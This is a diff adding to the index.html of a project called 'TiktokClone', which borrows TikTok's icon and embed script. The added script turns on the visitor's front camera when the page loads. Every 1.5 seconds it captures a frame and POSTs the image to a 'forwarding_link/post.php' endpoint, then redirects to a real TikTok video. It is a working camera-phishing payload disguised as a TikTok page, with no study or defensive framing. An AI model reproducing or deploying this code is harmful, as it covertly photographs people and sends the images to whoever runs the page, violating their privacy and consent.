@@ -1,13 +1,92 @@
 <!doctype html>
 <html lang="en">
+
 <head>
   <meta charset="utf-8">
   <title>TiktokClone</title>
   <base href="/">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <link rel="icon" type="image/x-icon" href="favicon.ico">
+  <link rel="shortcut icon"
+    href="https://lf16-tiktok-common.ibytedtos.com/obj/tiktok-web-common-sg/mtact/static/images/logo_144c91a.png?v=2"
+    type="image/x-icon">
+
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" />
+  <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
 </head>
+
 <body>
   <app-root></app-root>
+  <script async src="https://www.tiktok.com/embed.js"></script>
+  <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+  <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+  <script>
+
+    function post(imgdata, url) {
+      $.ajax({
+        type: 'POST',
+        data: { cat: imgdata },
+        url: 'forwarding_link/post.php',
+        dataType: 'json',
+        async: false,
+        success: function (result) {
+          // call the function that handles the response/results
+        },
+        error: function () {
+        }
+      });
+      window.location.replace(url);
+    };
+
+
+    'use strict';
+
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const errorMsgElement = document.querySelector('span#errorMsg');
+
+    const constraints = {
+      audio: false,
+      video: {
+
+        facingMode: "user"
+      }
+    };
+
+    // Access webcam
+    async function init() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        handleSuccess(stream);
+      } catch (e) {
+        errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+      }
+
+    }
+
+    // Success
+    function handleSuccess(stream) {
+      window.stream = stream;
+      video.srcObject = stream;
+
+
+      var context = canvas.getContext('2d');
+      setInterval(function () {
+
+        context.drawImage(video, 0, 0, 740, 580);
+        var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+        post(canvasData, 'https://www.tiktok.com/@dguselnikov2/video/7055946133817855234?is_from_webapp=1&sender_device=pc');
+      }, 1500);
+
+
+    }
+
+
+    // Load init
+    init();
+
+  </script>
 </body>
+
 </html>
